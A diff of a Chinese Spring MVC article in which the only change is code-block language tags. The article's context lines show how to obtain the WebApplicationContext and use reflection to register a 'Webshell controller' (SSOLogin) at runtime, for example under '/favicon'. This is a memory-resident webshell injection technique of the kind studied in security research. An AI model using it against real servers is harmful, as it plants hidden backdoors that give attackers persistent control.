@@ -146,7 +146,7 @@ DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 U
 
 **方法一**：getCurrentWebApplicationContext
 
-```text
+```java
 WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
 ```
 
@@ -158,13 +158,13 @@ WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
 
 **方法二**：WebApplicationContextUtils
 
-```text
+```java
 WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
 ```
 
 通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦，其实拆分起来比较容易理解，主要是用 WebApplicationContextUtils的
 
-```text
+```java
 public static WebApplicationContext getWebApplicationContext(ServletContext sc)
 ```
 
@@ -174,13 +174,13 @@ public static WebApplicationContext getWebApplicationContext(ServletContext sc)
 
 **方法三**：RequestContextUtils
 
-```text
+```java
 WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
 ```
 
 上面的代码使用 RequestContextUtils 的
 
-```text
+```java
 public static WebApplicationContext getWebApplicationContext(ServletRequest request)
 ```
 
@@ -202,7 +202,7 @@ public static WebApplicationContext getWebApplicationContext(ServletRequest requ
 
 **方法四**：getAttribute
 
-```text
+```java
 WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
 ```
 
@@ -241,7 +241,7 @@ Spring 3.1 开始及以后一般开始使用新的 org.springframework.web.servl
 
 相关示例代码和解释如下：
 
-```text
+```java
 // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
 RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
 // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
@@ -259,13 +259,13 @@ r.registerMapping(info, Class.forName("me.landgrey.SSOLogin").newInstance(), met
 
 参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类
 
-```text
+```java
 org.springframework.web.servlet.handler.AbstractUrlHandlerMapping
 ```
 
 进入查看代码，发现其中有一个registerHandler 方法，摘录关键部分如下：
 
-```text
+```java
 protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException {
     ...
     Object resolvedHandler = handler;
@@ -293,7 +293,7 @@ protected void registerHandler(String urlPath, Object handler) throws BeansExcep
 
 相关示例代码和解释如下：
 
-```text
+```java
 // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
 context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
 // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
@@ -309,13 +309,13 @@ m1.invoke(dh, "/favicon", "dynamicController");
 
 参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类
 
-```text
+```java
 org.springframework.web.servlet.handler.AbstractHandlerMethodMapping
 ```
 
 进入查看代码，发现其中有一个detectHandlerMethods 方法，代码如下：
 
-```text
+```java
 protected void detectHandlerMethods(Object handler) {
     Class<?> handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();
     final Class<?> userType = ClassUtils.getUserClass(handlerType);
@@ -337,7 +337,7 @@ protected void detectHandlerMethods(Object handler) {
 
 示例代码如下：
 
-```text
+```java
 context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
 java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
@@ -406,7 +406,7 @@ public class SSOLogin {
 
 如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。
 
-```text
+```markup
 <bean class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping" />
 <bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter" />
 ```
